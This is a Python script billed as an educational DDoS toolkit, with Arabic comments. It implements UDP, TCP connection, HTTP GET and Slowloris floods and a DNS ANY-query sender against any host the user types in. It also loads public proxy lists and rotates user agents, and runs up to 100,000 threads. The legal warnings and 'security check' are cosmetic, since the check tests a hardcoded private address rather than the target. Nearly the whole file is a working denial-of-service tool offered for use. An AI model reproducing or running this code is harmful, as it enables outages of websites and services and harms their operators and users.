"""
# ============================================
# DDOS ADVANCED TOOLKIT v3.0 - التعليمي فقط
# Advanced Features: Multi-Method, Proxy, Spoof
# Author: Security Researcher - For Educational
# ============================================
"""

import socket
import threading
import random
import time
import os
import sys
import struct
import select
import ipaddress
from concurrent.futures import ThreadPoolExecutor
import requests
from fake_useragent import UserAgent

# ==================== CONFIG ====================
VERSION = "3.0"
MAX_THREADS = 100000
ATTACK_DURATION = 300  # ثواني

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ==================== BANNER ====================
def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""
{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║  ██████╗ ██████╗  ██████╗ ███████╗     ██████╗ ███████╗ ║
║  ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔═══██╗██╔════╝ ║
║  ██║  ██║██║  ██║██║   ██║███████╗    ██║   ██║███████╗ ║
║  ██║  ██║██║  ██║██║   ██║╚════██║    ██║   ██║╚════██║ ║
║  ██████╔╝██████╔╝╚██████╔╝███████║    ╚██████╔╝███████║ ║
║  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝     ╚═════╝ ╚══════╝ ║
║                                                          ║
║                [ VERSION {VERSION} - EDUCATIONAL ]             ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.YELLOW}⚠️  FOR EDUCATIONAL & RESEARCH PURPOSES ONLY!{Colors.END}
{Colors.CYAN}📚 University Project - Cybersecurity Analysis{Colors.END}
"""
    print(banner)

# ==================== SECURITY CHECK ====================
def security_check():
    """فحص أمني لتجنب المشاكل القانونية"""
    print(f"{Colors.YELLOW}[!] Performing Security Check...{Colors.END}")
    
    # فحص إذا كان IP خاص
    test_ip = "192.168.1.1"
    if ipaddress.ip_address(test_ip).is_private:
        print(f"{Colors.GREEN}[+] Private IP Check: PASS{Colors.END}")
    else:
        print(f"{Colors.RED}[-] WARNING: Public IP detected!{Colors.END}")
    
    # تحذير قانوني
    print(f"\n{Colors.RED}{Colors.BOLD}LEGAL WARNING:{Colors.END}")
    print(f"{Colors.RED}• Unauthorized use is illegal")
    print(f"• For educational environments only")
    print(f"• Always get written permission{Colors.END}")
    
    input(f"\n{Colors.YELLOW}Press Enter to accept terms...{Colors.END}")

# ==================== PROXY SYSTEM ====================
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.ua = UserAgent()
    
    def load_proxies(self, source="file"):
        """تحميل قائمة بروكسيات"""
        proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        ]
        
        for url in proxy_sources:
            try:
                response = requests.get(url, timeout=5)
                self.proxies = response.text.split('\n')
                print(f"{Colors.GREEN}[+] Loaded {len(self.proxies)} proxies{Colors.END}")
                break
            except:
                continue
    
    def get_random_proxy(self):
        """الحصول على بروكسي عشوائي"""
        if self.proxies:
            proxy = random.choice(self.proxies).strip()
            return {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
        return None
    
    def get_random_ua(self):
        """وكيل مستخدم عشوائي"""
        return self.ua.random

# ==================== ATTACK METHODS ====================
class AttackMethods:
    @staticmethod
    def udp_flood(target_ip, target_port, duration):
        """UDP Flood متقدم"""
        print(f"{Colors.BLUE}[*] Starting UDP Flood...{Colors.END}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.5)
        
        packets_sent = 0
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                # حزم بأحجام مختلفة
                packet_size = random.choice([1024, 512, 1480, 2048])
                data = random._urandom(packet_size)
                
                # إرسال إلى منافذ متعددة
                for port in range(target_port, target_port + 10):
                    sock.sendto(data, (target_ip, port))
                    packets_sent += 1
                
                # عرض الإحصائيات
                if packets_sent % 1000 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.GREEN}[+] Packets: {packets_sent} | Rate: {packets_sent/elapsed:.1f}/s{Colors.END}")
                    
            except Exception as e:
                print(f"{Colors.RED}[-] Error: {e}{Colors.END}")
        
        sock.close()
        return packets_sent
    
    @staticmethod
    def tcp_syn_flood(target_ip, target_port, duration):
        """SYN Flood متقدم"""
        print(f"{Colors.BLUE}[*] Starting SYN Flood...{Colors.END}")
        
        connections = 0
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                # إنشاء سوكت جديد لكل حزمة SYN
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                
                # محاولة الاتصال (تترك SYN معلقة)
                s.connect_ex((target_ip, target_port))
                connections += 1
                
                # عدم إغلاق الاتصال (تركه معلق)
                if connections % 100 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.YELLOW}[~] SYN packets: {connections} | Rate: {connections/elapsed:.1f}/s{Colors.END}")
                    
            except:
                pass
        
        return connections
    
    @staticmethod
    def http_flood(target_ip, target_port, duration):
        """HTTP GET Flood"""
        print(f"{Colors.BLUE}[*] Starting HTTP Flood...{Colors.END}")
        
        requests_sent = 0
        start_time = time.time()
        url = f"http://{target_ip}:{target_port}"
        
        headers_list = [
            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
            {'User-Agent': 'curl/7.68.0'}
        ]
        
        while time.time() - start_time < duration:
            try:
                headers = random.choice(headers_list)
                response = requests.get(url, headers=headers, timeout=1)
                requests_sent += 1
                
                if requests_sent % 50 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.CYAN}[*] HTTP Requests: {requests_sent} | Status: {response.status_code}{Colors.END}")
                    
            except:
                requests_sent += 1
        
        return requests_sent
    
    @staticmethod
    def slowloris(target_ip, target_port, duration):
        """Slowloris Attack"""
        print(f"{Colors.BLUE}[*] Starting Slowloris...{Colors.END}")
        
        sockets = []
        start_time = time.time()
        
        # إنشاء اتصالات كثيرة وبطيئة
        while time.time() - start_time < duration and len(sockets) < 500:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_ip, target_port))
                
                # إرسال طلب HTTP غير مكتمل
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send("Host: {target_ip}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                s.send("Content-Length: 42\r\n".encode())
                
                sockets.append(s)
                print(f"{Colors.PURPLE}[+] Open connections: {len(sockets)}{Colors.END}")
                
            except:
                pass
            
            # إبقاء الاتصالات مفتوحة
            time.sleep(0.5)
        
        # إغلاق جميع الاتصالات
        for s in sockets:
            try:
                s.close()
            except:
                pass
        
        return len(sockets)
    
    @staticmethod
    def dns_amplification(target_ip, target_port, duration):
        """DNS Amplification (نظري)"""
        print(f"{Colors.BLUE}[*] Simulating DNS Amplification...{Colors.END}")
        
        # DNS query لـ ANY (تضخيم)
        dns_query = bytearray([
            0x12, 0x34,  # ID
            0x01, 0x00,  # Flags
            0x00, 0x01,  # Questions
            0x00, 0x00,  # Answer RRs
            0x00, 0x00,  # Authority RRs
            0x00, 0x00   # Additional RRs
        ])
        
        # إضافة domain
        domain = "google.com"
        for part in domain.split('.'):
            dns_query.append(len(part))
            dns_query.extend(part.encode())
        dns_query.append(0x00)
        
        # Type ANY, Class IN
        dns_query.extend([0x00, 0xFF, 0x00, 0x01])
        
        packets_sent = 0
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(bytes(dns_query), (target_ip, 53))
                packets_sent += 1
                
                if packets_sent % 100 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.YELLOW}[~] DNS packets: {packets_sent}{Colors.END}")
                    
            except:
                pass
        
        return packets_sent

# ==================== MAIN CONTROLLER ====================
class DDoSAttackController:
    def __init__(self):
        self.methods = AttackMethods()
        self.proxy_manager = ProxyManager()
        self.attacks_running = []
        self.statistics = {
            'total_packets': 0,
            'total_requests': 0,
            'start_time': None,
            'methods_used': []
        }
    
    def show_menu(self):
        """عرض القائمة الرئيسية"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}══════════ ATTACK METHODS ══════════{Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} UDP Flood")
        print(f"{Colors.GREEN}[2]{Colors.END} SYN Flood")
        print(f"{Colors.GREEN}[3]{Colors.END} HTTP GET Flood")
        print(f"{Colors.GREEN}[4]{Colors.END} Slowloris Attack")
        print(f"{Colors.GREEN}[5]{Colors.END} DNS Amplification")
        print(f"{Colors.GREEN}[6]{Colors.END} Mixed Attacks")
        print(f"{Colors.GREEN}[7]{Colors.END} Load Proxy List")
        print(f"{Colors.GREEN}[8]{Colors.END} Show Statistics")
        print(f"{Colors.RED}[0]{Colors.END} Exit")
        
        choice = input(f"\n{Colors.YELLOW}Select method (0-8): {Colors.END}")
        return choice
    
    def get_target_info(self):
        """الحصول على معلومات الهدف"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}══════════ TARGET INFO ══════════{Colors.END}")
        
        target_ip = input(f"{Colors.YELLOW}Target IP/Domain: {Colors.END}").strip()
        
        # تحويل domain إلى IP
        if not target_ip.replace('.', '').isdigit():
            try:
                target_ip = socket.gethostbyname(target_ip)
                print(f"{Colors.GREEN}[+] Resolved to: {target_ip}{Colors.END}")
            except:
                print(f"{Colors.RED}[-] Cannot resolve domain{Colors.END}")
                return None, None
        
        target_port = input(f"{Colors.YELLOW}Target Port (default 80): {Colors.END}").strip()
        target_port = int(target_port) if target_port else 80
        
        duration = input(f"{Colors.YELLOW}Duration in seconds (default 30): {Colors.END}").strip()
        duration = int(duration) if duration else 30
        
        threads = input(f"{Colors.YELLOW}Threads (default 100): {Colors.END}").strip()
        threads = int(threads) if threads else 100
        
        return target_ip, target_port, duration, threads
    
    def start_attack(self, method, target_ip, target_port, duration, threads):
        """بدء الهجوم"""
        print(f"\n{Colors.BOLD}{Colors.RED}══════════ STARTING ATTACK ══════════{Colors.END}")
        print(f"{Colors.YELLOW}Target:{Colors.END} {target_ip}:{target_port}")
        print(f"{Colors.YELLOW}Method:{Colors.END} {method}")
        print(f"{Colors.YELLOW}Duration:{Colors.END} {duration}s | {Colors.YELLOW}Threads:{Colors.END} {threads}")
        
        self.statistics['start_time'] = time.time()
        self.statistics['methods_used'].append(method)
        
        # بدء الهجوم بخيوط متعددة
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for _ in range(threads):
                if method == "UDP":
                    future = executor.submit(self.methods.udp_flood, target_ip, target_port, duration)
                elif method == "SYN":
                    future = executor.submit(self.methods.tcp_syn_flood, target_ip, target_port, duration)
                elif method == "HTTP":
                    future = executor.submit(self.methods.http_flood, target_ip, target_port, duration)
                elif method == "SLOWLORIS":
                    future = executor.submit(self.methods.slowloris, target_ip, target_port, duration)
                elif method == "DNS":
                    future = executor.submit(self.methods.dns_amplification, target_ip, target_port, duration)
                
                futures.append(future)
            
            # جمع النتائج
            total_packets = 0
            for future in futures:
                try:
                    result = future.result(timeout=duration + 5)
                    total_packets += result
                except:
                    pass
        
        self.statistics['total_packets'] += total_packets
        return total_packets
    
    def mixed_attack(self, target_ip, target_port, duration, threads):
        """هجوم مختلط بمتعدد الطرق"""
        print(f"\n{Colors.BOLD}{Colors.RED}══════════ MIXED ATTACK ══════════{Colors.END}")
        
        methods = ["UDP", "SYN", "HTTP"]
        results = {}
        
        # تقسيم الخيوط بين الطرق
        threads_per_method = threads // len(methods)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for method in methods:
                for _ in range(threads_per_method):
                    if method == "UDP":
                        executor.submit(self.methods.udp_flood, target_ip, target_port, duration)
                    elif method == "SYN":
                        executor.submit(self.methods.tcp_syn_flood, target_ip, target_port, duration)
                    elif method == "HTTP":
                        executor.submit(self.methods.http_flood, target_ip, target_port, duration)
        
        print(f"{Colors.GREEN}[+] Mixed attack completed!{Colors.END}")
    
    def show_statistics(self):
        """عرض الإحصائيات"""
        if not self.statistics['start_time']:
            print(f"{Colors.RED}[-] No attacks performed yet{Colors.END}")
            return
        
        elapsed = time.time() - self.statistics['start_time']
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}══════════ STATISTICS ══════════{Colors.END}")
        print(f"{Colors.YELLOW}Total Packets/Requests:{Colors.END} {self.statistics['total_packets']:,}")
        print(f"{Colors.YELLOW}Attack Duration:{Colors.END} {elapsed:.1f} seconds")
        print(f"{Colors.YELLOW}Methods Used:{Colors.END} {', '.join(self.statistics['methods_used'])}")
        print(f"{Colors.YELLOW}Average Rate:{Colors.END} {self.statistics['total_packets']/elapsed:.1f}/s")
        
        # تقدير حجم البيانات
        data_mb = (self.statistics['total_packets'] * 1024) / (1024 * 1024)
        print(f"{Colors.YELLOW}Estimated Data Sent:{Colors.END} {data_mb:.2f} MB")
    
    def generate_report(self):
        """توليد تقرير مفصل"""
        report = f"""
        =========================================
        DDOS ATTACK ANALYSIS REPORT
        =========================================
        Date: {time.strftime('%Y-%m-%d %H:%M:%S')}
        Tool Version: {VERSION}
        
        ATTACK STATISTICS:
        - Total Packets: {self.statistics['total_packets']:,}
        - Methods Used: {', '.join(self.statistics['methods_used'])}
        - Duration: {time.time() - self.statistics['start_time']:.1f}s
        
        TECHNICAL ANALYSIS:
        1. UDP Flood: Best for bandwidth exhaustion
        2. SYN Flood: Effective against connection limits
        3. HTTP Flood: Application layer attack
        4. Slowloris: Resource exhaustion
        
        DEFENSE RECOMMENDATIONS:
        • Implement rate limiting
        • Use DDoS protection services
        • Configure firewalls properly
        • Monitor network traffic
        
        LEGAL DISCLAIMER:
        This report is for educational purposes only.
        Unauthorized attacks are illegal.
        =========================================
        """
        
        filename = f"ddos_report_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(report)
        
        print(f"{Colors.GREEN}[+] Report saved as: {filename}{Colors.END}")
        return report

# ==================== MAIN ====================
def main():
    """الدالة الرئيسية"""
    show_banner()
    security_check()
    
    controller = DDoSAttackController()
    
    while True:
        choice = controller.show_menu()
        
        if choice == '0':
            print(f"\n{Colors.GREEN}[+] Exiting... Goodbye!{Colors.END}")
            break
        
        elif choice == '7':
            controller.proxy_manager.load_proxies()
            input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
        elif choice == '8':
            controller.show_statistics()
            input(f"{Colors.Yellow}Press Enter to continue...{Colors.END}")
        
        elif choice in ['1', '2', '3', '4', '5', '6']:
            target_ip, target_port, duration, threads = controller.get_target_info()
            
            if not target_ip:
                continue
            
            # تحذير إضافي
            confirm = input(f"{Colors.RED}Start attack? (y/n): {Colors.END}").lower()
            if confirm != 'y':
                continue
            
            if choice == '1':
                result = controller.start_attack("UDP", target_ip, target_port, duration, threads)
                print(f"{Colors.GREEN}[+] UDP Flood sent {result:,} packets{Colors.END}")
            
            elif choice == '2':
                result = controller.start_attack("SYN", target_ip, target_port, duration, threads)
                print(f"{Colors.GREEN}[+] SYN Flood sent {result:,} packets{Colors.END}")
            
            elif choice == '3':
                result = controller.start_attack("HTTP", target_ip, target_port, duration, threads)
                print(f"{Colors.GREEN}[+] HTTP Flood sent {result:,} requests{Colors.END}")
            
            elif choice == '4':
                result = controller.start_attack("SLOWLORIS", target_ip, target_port, duration, threads)
                print(f"{Colors.GREEN}[+] Slowloris opened {result:,} connections{Colors.END}")
            
            elif choice == '5':
                result = controller.start_attack("DNS", target_ip, target_port, duration, threads)
                print(f"{Colors.GREEN}[+] DNS Amplification sent {result:,} packets{Colors.END}")
            
            elif choice == '6':
                controller.mixed_attack(target_ip, target_port, duration, threads)
            
            # توليد التقرير
            report = controller.generate_report()
            
            input(f"\n{Colors.Yellow}Press Enter to continue...{Colors.END}")
        
        else:
            print(f"{Colors.RED}[-] Invalid choice{Colors.END}")

# ==================== REQUIREMENTS ====================
def install_requirements():
    """تثبيت المكتبات المطلوبة"""
    requirements = """
    requests==2.31.0
    fake-useragent==1.4.0
    """
    
    print(f"{Colors.YELLOW}[!] Installing requirements...{Colors.END}")
    os.system("pip install requests fake-useragent")

# ==================== EXECUTION ====================
if __name__ == "__main__":
    try:
        import requests
        from fake_useragent import UserAgent
    except ImportError:
        print(f"{Colors.RED}[!] Requirements not installed!{Colors.END}")
        install_requirements()
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrupted by user{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.END}")